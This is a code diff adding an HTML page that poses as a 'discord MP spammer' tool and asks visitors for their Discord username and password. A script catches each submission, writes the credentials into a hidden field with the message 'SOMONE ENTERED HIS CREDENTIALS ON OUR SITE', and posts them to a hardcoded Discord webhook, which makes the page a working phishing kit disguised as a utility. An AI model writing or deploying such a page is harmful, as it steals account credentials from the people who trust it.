@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Document</title>
+</head>
+<body>
+    <div class="title"><h1>Welcome to the discord <span id="red">MP spammer</span></h1></div>
+    <div class="text"><p>Here you have to connect to your discord account than choose what user you want to spam and if its anonimous or not</p></div>
+    <form action="https://discord.com/api/webhooks/1234832362471161877/0fK06Jz4e_qIE5KVBqM8fjtIen4Ul3dhS1IUOvLQ0pByppwC4MpWuugnGG8G2YXSBQYx" method="post">
+        <label for="username">Discord Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Discord Password:</label><br>
+        <input type="password" id="password" name="password"><br>
+        <!-- Include content in hidden field -->
+        <input type="hidden" name="content" id="content">
+        <input type="submit" value="Submit">
+    </form>
+    <p class="contact-us"><br><br>If you have problems to connect please contact us.</p>
+
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Jersey+15&display=swap');
+        </style>
+    
+    <script>
+        // Set content field value when form is submitted
+        document.querySelector('form').addEventListener('submit', function(event) {
+            // Prevent form from submitting normally
+            event.preventDefault();
+    
+            // Get values of username and password fields
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+    
+            // Set content field value with username and password
+            document.getElementById('content').value = 'SOMONE ENTERED HIS CREDENTIALS ON OUR SITE : ' + 'Username: ' + username + ', Password: ' + password;
+    
+            // Submit form
+            this.submit();
+        });
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Jersey+15&family=Kanit:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+    </style>
+    
+</body>
+</html>
+
+
+
